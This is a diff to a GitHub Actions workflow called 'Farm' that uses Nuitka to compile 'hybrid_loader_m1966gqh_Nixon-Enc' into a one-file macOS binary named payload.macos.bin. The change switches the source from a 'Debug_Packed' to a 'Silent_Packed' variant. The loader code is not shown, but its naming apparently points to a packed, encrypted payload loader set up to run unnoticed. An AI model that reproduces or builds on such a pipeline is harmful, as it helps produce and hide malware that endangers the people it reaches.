@@ -3,12 +3,12 @@ name: Farm
 on: workflow_dispatch
 jobs:
   desktop-farm:
-    if: ${ '{os: macos-14, target: macos, artifact: payload.macos.bin, cmd: "pip3 install nuitka zstandard ordered-set requests websockets && python3 -m nuitka --standalone --onefile --output-filename=payload.macos.bin hybrid_loader_m1966gqh_Nixon-Enc_Debug_Packed.py"}' != '' }
+    if: ${ '{os: macos-14, target: macos, artifact: payload.macos.bin, cmd: "pip3 install nuitka zstandard ordered-set requests websockets && python3 -m nuitka --standalone --onefile --output-filename=payload.macos.bin hybrid_loader_m1966gqh_Nixon-Enc_Silent_Packed.py"}' != '' }
     strategy:
       fail-fast: false
       matrix:
         include:
-          [{os: macos-14, target: macos, artifact: payload.macos.bin, cmd: "pip3 install nuitka zstandard ordered-set requests websockets && python3 -m nuitka --standalone --onefile --output-filename=payload.macos.bin hybrid_loader_m1966gqh_Nixon-Enc_Debug_Packed.py"}]
+          [{os: macos-14, target: macos, artifact: payload.macos.bin, cmd: "pip3 install nuitka zstandard ordered-set requests websockets && python3 -m nuitka --standalone --onefile --output-filename=payload.macos.bin hybrid_loader_m1966gqh_Nixon-Enc_Silent_Packed.py"}]
     runs-on: ${{ matrix.os }}
     steps:
       - uses: actions/checkout@v4
